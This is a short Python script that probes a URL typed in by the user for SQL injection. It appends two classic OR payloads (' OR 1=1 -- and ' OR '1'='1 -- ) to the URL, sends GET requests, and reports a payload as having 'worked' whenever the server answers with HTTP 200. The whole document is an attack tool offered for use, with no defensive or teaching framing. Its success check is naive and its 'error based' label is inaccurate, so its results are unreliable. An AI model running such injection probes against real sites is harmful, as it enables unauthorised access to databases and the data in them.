#!/usr/bin/python

import requests

ORpayloads = ["' OR 1=1 -- ",
	"' OR '1'='1 -- "  ]

def or_injection(url):
	print ("Trying Error Based Injection with OR Payloads...")
	for i in range(0,len(ORpayloads)):
		r = requests.get(url+ORpayloads[i])
		if r.status_code == 200:
			print ("{} worked".format(url + ORpayloads[i]))


url = input("URL: ")
or_injection(url) 

